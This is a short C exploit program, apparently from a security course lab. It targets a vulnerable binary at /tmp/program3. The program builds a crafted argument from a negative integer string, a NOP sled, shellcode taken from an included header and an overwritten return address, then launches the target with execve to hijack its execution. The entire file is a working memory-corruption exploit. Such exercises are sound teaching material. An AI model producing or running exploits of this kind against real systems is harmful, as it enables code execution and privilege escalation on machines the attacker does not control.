#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define PROGRAM "/tmp/program3"

int main(void)
{
  char *args[3];
  char *environ[1];

  char ex[54413];

  char num[12]="-2147482798";

  int count_index=0;
  memset(ex,'\x90', 54413);

  for (int i=0; i<11; i++){
	  ex[i] = num[count_index];
	  count_index++;
  }

  ex[11]=',';

  for (int i=12; i<50000; i++){
	  ex[i]='\x90';
  }
  
  int shell_index=0;
  for (int i=50000; i<50045; i++){
	  ex[i] = shellcode[shell_index];
	  shell_index++;
  }
	
  ex[54356]='\xc0';
  ex[54357]='\x6c';
  ex[54358]='\xfe';
  ex[54359]='\xff';

  ex[54412]='\x00';


  args[0] = PROGRAM;
  args[1] = ex;
  args[2] = NULL;
  environ[0] = NULL;

  if (0 > execve(PROGRAM, args, environ))
    fprintf(stderr, "call to execve failed.\n");

  return 0;
}
